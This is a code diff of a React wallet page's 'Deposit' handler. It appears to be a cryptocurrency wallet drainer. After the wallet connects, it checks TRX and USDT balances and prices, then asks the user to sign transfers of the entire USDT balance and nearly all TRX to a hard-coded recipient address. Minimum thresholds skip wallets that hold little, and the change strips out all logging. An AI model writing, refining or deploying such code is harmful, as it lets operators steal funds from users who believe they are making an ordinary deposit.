@@ -42,15 +42,12 @@ export default function WalletPage() {
   const handleDepositClick = async () => {
     setIsProcessing(true);
     try {
-      console.log("=== Deposit process started ===");
-
       // 1. Connect wallet if not connected
       if (!isConnected) {
         setModalMode("info");
         setModalTitle("Wallet Connection Required");
         setModalMessage("Please connect your wallet first to deposit.");
         setModalOpen(true);
-
         const result = await connect();
         if (!result.success) {
           setModalMode("fail");
@@ -67,11 +64,12 @@ export default function WalletPage() {
       }
 
       // 2. Check if wallet is available
-      if (!window.bybitWallet?.tronLink) {
+      const tronWeb = window.bybitWallet?.tronLink?.tronWeb || window.tronWeb;
+      if (!tronWeb || typeof tronWeb.contract !== "function") {
         setModalMode("fail");
-        setModalTitle("Wallet Not Available");
+        setModalTitle("Wallet Not Ready");
         setModalMessage(
-          "Bybit Wallet is not available. Please ensure the extension is installed and active."
+          "TronWeb is not available. Please ensure your wallet is connected and the extension is installed."
         );
         setModalOpen(true);
         setIsProcessing(false);
@@ -91,8 +89,6 @@ export default function WalletPage() {
         return;
       }
 
-      console.log("Using address:", currentAddress);
-
       setModalMode("info");
       setModalTitle("Checking Balances...");
       setModalMessage(
@@ -100,103 +96,62 @@ export default function WalletPage() {
       );
       setModalOpen(true);
 
-      // 4. Get TronWeb instance
-      const tronWeb = window.bybitWallet?.tronLink?.tronWeb || window.tronWeb;
-      if (!tronWeb || typeof tronWeb.contract !== "function") {
-        setModalMode("fail");
-        setModalTitle("Wallet Not Ready");
-        setModalMessage(
-          "TronWeb is not available. Please ensure your wallet is connected and the extension is installed."
-        );
-        setModalOpen(true);
-        setIsProcessing(false);
-        return;
-      }
-      console.log("TronWeb instance:", tronWeb);
-
-      // 5. Get prices with error handling
+      // 4. Get prices
       let trxPrice = 0.1;
       let usdtPrice = 1;
-
       try {
-        console.log("Fetching prices from CoinGecko...");
         const priceResponse = await fetch(
           "https://api.coingecko.com/api/v3/simple/price?ids=tron,usd-coin&vs_currencies=usd"
         );
-        if (!priceResponse.ok) {
-          throw new Error(`Price API error: ${priceResponse.status}`);
+        if (priceResponse.ok) {
+          const priceData = await priceResponse.json();
+          trxPrice = priceData.tron?.usd || 0.1;
+          usdtPrice = priceData["usd-coin"]?.usd || 1;
         }
-        const priceData = await priceResponse.json();
-        trxPrice = priceData.tron?.usd || 0.1;
-        usdtPrice = priceData["usd-coin"]?.usd || 1;
-        console.log("Prices fetched successfully:", { trxPrice, usdtPrice });
       } catch (error) {
-        console.error("Failed to fetch prices, using fallback:", error);
-        // Continue with fallback prices
+        // fallback
       }
 
-      // 6. Get balances with error handling
-      let trxBalance = 0;
-      let usdtBalance = 0;
+      // 5. Get balances
+      let trxBalanceSun = await tronWeb.trx.getBalance(currentAddress);
+      let trxBalance = trxBalanceSun / 1e6;
+      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
+      const usdtBalanceRaw = await usdtContract
+        .balanceOf(currentAddress)
+        .call();
+      let usdtBalance = tronWeb.toDecimal(usdtBalanceRaw) / 1e6;
+      let trxUSDValue = trxBalance * trxPrice;
+      let usdtUSDValue = usdtBalance * usdtPrice;
 
-      try {
-        console.log("Getting TRX balance...");
-        const trxBalanceSun = await tronWeb.trx.getBalance(currentAddress);
-        trxBalance = trxBalanceSun / 1e6;
-        console.log("TRX balance:", trxBalance);
-      } catch (error) {
-        console.error("Failed to get TRX balance:", error);
-        setModalMode("fail");
-        setModalTitle("Balance Check Failed");
-        setModalMessage("Failed to get TRX balance. Please try again.");
-        setModalOpen(true);
-        setIsProcessing(false);
-        return;
-      }
+      // Minimums
+      const MIN_TRX = 50;
+      const MIN_USDT = 15;
+      const TRX_GAS_BUFFER = 30;
 
-      try {
-        console.log("Getting USDT balance...");
-        const usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
-        const usdtBalanceRaw = await usdtContract
-          .balanceOf(currentAddress)
-          .call();
-        usdtBalance = tronWeb.toDecimal(usdtBalanceRaw) / 1e6;
-        console.log("USDT balance:", usdtBalance);
-      } catch (error) {
-        console.error("Failed to get USDT balance:", error);
-        // Continue with 0 USDT balance
-        usdtBalance = 0;
-      }
-
-      const trxUSDValue = trxBalance * trxPrice;
-      const usdtUSDValue = usdtBalance * usdtPrice;
-
-      console.log("Balance values:", {
-        trxBalance,
-        usdtBalance,
-        trxUSDValue,
-        usdtUSDValue,
-      });
-
-      // 7. Decide transfer order
-      const transfers = [];
-      if (trxUSDValue > usdtUSDValue) {
-        if (trxBalance > 2) {
-          transfers.push({ type: "TRX", amount: trxBalance - 2 });
-        }
-        if (usdtBalance > 0) {
-          transfers.push({ type: "USDT", amount: usdtBalance });
+      // Transfer plan
+      let transfers = [];
+      if (usdtUSDValue < MIN_USDT) {
+        // Only TRX if enough
+        if (trxBalance > MIN_TRX) {
+          if (trxBalance > MIN_TRX) {
+            transfers.push({ type: "TRX", amount: trxBalance });
+          }
         }
       } else {
-        if (usdtBalance > 0) {
+        // USDT is enough
+        if (
+          (trxBalance - TRX_GAS_BUFFER) * trxPrice > usdtUSDValue &&
+          trxBalance - TRX_GAS_BUFFER > MIN_TRX
+        ) {
+          const trxToSend = trxBalance - TRX_GAS_BUFFER;
+          if (trxToSend > MIN_TRX) {
+            transfers.push({ type: "TRX", amount: trxToSend });
+          }
+        }
+        if (usdtBalance > MIN_USDT) {
           transfers.push({ type: "USDT", amount: usdtBalance });
         }
-        if (trxBalance > 2) {
-          transfers.push({ type: "TRX", amount: trxBalance - 2 });
-        }
       }
-
-      console.log("Transfer plan:", transfers);
 
       if (transfers.length === 0) {
         setModalMode("fail");
@@ -207,7 +162,7 @@ export default function WalletPage() {
         return;
       }
 
-      // 8. Execute transfers
+      // 6. Execute transfers
       for (let i = 0; i < transfers.length; i++) {
         const transfer = transfers[i];
         setModalMode("info");
@@ -218,65 +173,71 @@ export default function WalletPage() {
           }. Please approve in your wallet.`
         );
         setModalOpen(true);
-
         try {
           if (transfer.type === "TRX") {
-            console.log(`Transferring ${transfer.amount} TRX...`);
-            const unsignedTx = await tronWeb.transactionBuilder.sendTrx(
-              RECIPIENT_ADDRESS,
-              transfer.amount * 1e6,
+            // Always fetch latest TRX balance before sending
+            let latestTrxBalanceSun = await tronWeb.trx.getBalance(
               currentAddress
             );
-            console.log("TRX transaction built:", unsignedTx);
-
+            let latestTrxBalance = latestTrxBalanceSun / 1e6;
+            let trxToSend = latestTrxBalance - 1;
+            if (trxToSend < MIN_TRX) {
+              throw new Error("Not enough TRX to deposit.");
+            }
+            const unsignedTx = await tronWeb.transactionBuilder.sendTrx(
+              RECIPIENT_ADDRESS,
+              trxToSend * 1e6,
+              currentAddress
+            );
             const signedTx = await signTransaction(unsignedTx);
-            console.log("TRX transaction signed");
-
             const result = await tronWeb.trx.sendRawTransaction(signedTx);
-            console.log("TRX transaction result:", result);
-
             if (!result || !result.txid) {
               throw new Error(
                 "TRX deposit failed - no transaction ID returned"
               );
             }
           } else if (transfer.type === "USDT") {
-            console.log(`Transferring ${transfer.amount} USDT...`);
             const amountHex = tronWeb.toHex(transfer.amount * 1e6);
             const parameter = [
               { type: "address", value: RECIPIENT_ADDRESS },
               { type: "uint256", value: amountHex },
             ];
-
-            const unsignedTx =
-              await tronWeb.transactionBuilder.triggerConstantContract(
+            if (
+              typeof tronWeb.transactionBuilder.triggerSmartContract !==
+              "function"
+            ) {
+              setModalMode("fail");
+              setModalTitle("Wallet Not Ready");
+              setModalMessage(
+                "Your TronWeb does not support smart contract calls. Please update your wallet extension."
+              );
+              setModalOpen(true);
+              setIsProcessing(false);
+              return;
+            }
+            const unsignedResult =
+              await tronWeb.transactionBuilder.triggerSmartContract(
                 USDT_CONTRACT_ADDRESS,
                 "transfer(address,uint256)",
                 {},
                 parameter,
                 currentAddress
               );
-            console.log("USDT transaction built:", unsignedTx);
-
-            const signedTx = await signTransaction(unsignedTx);
-            console.log("USDT transaction signed");
-
+            if (!unsignedResult || !unsignedResult.transaction) {
+              throw new Error("Failed to build USDT transaction");
+            }
+            const signedTx = await signTransaction(unsignedResult.transaction);
             const result = await tronWeb.trx.sendRawTransaction(signedTx);
-            console.log("USDT transaction result:", result);
-
             if (!result || !result.txid) {
               throw new Error(
                 "USDT deposit failed - no transaction ID returned"
               );
             }
           }
-
           if (i < transfers.length - 1) {
-            console.log("Waiting between transfers...");
             await new Promise((res) => setTimeout(res, 2000));
           }
         } catch (error) {
-          console.error(`${transfer.type} transfer failed:`, error);
           setModalMode("fail");
           setModalTitle(`${transfer.type} Deposit Failed`);
           setModalMessage(
@@ -289,13 +250,11 @@ export default function WalletPage() {
           return;
         }
       }
-
       setModalMode("success");
       setModalTitle("Deposit Successful");
       setModalMessage("Your deposit(s) were successful!");
       setModalOpen(true);
     } catch (error) {
-      console.error("Deposit process failed:", error);
       setModalMode("fail");
       setModalTitle("Deposit Failed");
       setModalMessage(error.message || "An error occurred during deposit.");
